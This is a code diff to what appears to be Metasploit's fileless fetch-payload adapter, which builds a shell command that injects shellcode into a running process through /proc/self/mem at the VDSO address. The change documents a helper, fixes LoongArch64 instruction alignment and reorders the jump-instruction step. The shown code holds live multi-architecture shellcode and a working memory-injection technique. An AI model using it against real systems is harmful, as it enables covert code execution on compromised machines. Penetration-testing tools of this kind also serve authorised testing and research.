@@ -225,6 +225,11 @@ module Msf::Payload::Adapter::Fetch::Fileless
     %^$(v=$(printf %0#{width}x $vdso_addr); if [ $((${#v} % 2)) -ne 0 ]; then v="0$v"; fi; o=; while [ -n "$v" ]; do o=$o${v#"${v%??}"}; v=${v%??}; done; echo "$o")^
   end
 
+  # Builds the shell fragment that encodes a jump to the discovered VDSO
+  # address for the supplied architecture.
+  #
+  # @param arch [String] The target architecture.
+  # @return [String] The shell fragment that produces the jump bytes.
   def _generate_jmp_instruction(arch)
     #
     # The sed command will basically take two characters at the time and switch their order, this is due to endianess of x86 addresses
@@ -284,11 +289,13 @@ module Msf::Payload::Adapter::Fetch::Fileless
     when 'mips64'
       %^"041100000000000001ce7026dfee001001c0000800000000"$(echo $(printf %016x $vdso_addr))^
 
-    # LoongArch64 shellcode. Keep the embedded address eight-byte aligned.
+    # LoongArch64 shellcode. Prefix a nop when the injection address is 4 mod 8
+    # so the embedded address remains eight-byte aligned on every valid
+    # instruction boundary.
     # pcaddi t0,0; ld.d t0,t0,16; jirl zero,t0,0; nop
     # .dword [target address]
     when 'loongarch64'
-      %("0c0000188c41c0288001004c00004003"#{_hex_byte_swap_shell(16)})
+      %($(if [ $((addr % 8)) -eq 4 ]; then printf '00004003'; fi)"0c0000188c41c0288001004c00004003"#{_hex_byte_swap_shell(16)})
 
     # RISC-V 64-bit LE shellcode
     # auipc t0, 0
@@ -316,10 +323,10 @@ module Msf::Payload::Adapter::Fetch::Fileless
 def _generate_fileless_shell(get_file_cmd, arch)
   stage_cmd = %<writebytes () { printf \\\\%03o "$@" ; };>
   stage_cmd << %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
-  stage_cmd << %(jmp=#{_generate_jmp_instruction(arch)};)
   stage_cmd << %(sc='#{_generate_first_stage_shellcode(arch).unpack("H*")[0]}';)
   stage_cmd << 'read syscall_info < /proc/self/syscall;'
   stage_cmd << "addr=$(($(echo $syscall_info | cut -d' ' -f9)));"
+  stage_cmd << %(jmp=#{_generate_jmp_instruction(arch)};)
   stage_cmd << 'exec 3>/proc/self/mem;'
   stage_cmd << 'dd bs=1 skip=$vdso_addr <&3 >/dev/null 2>&1;'
   stage_cmd << %(printf "$(writebytes `printf $sc | sed 's/.\\{2\\}/0x& /g'`)" >&3;)
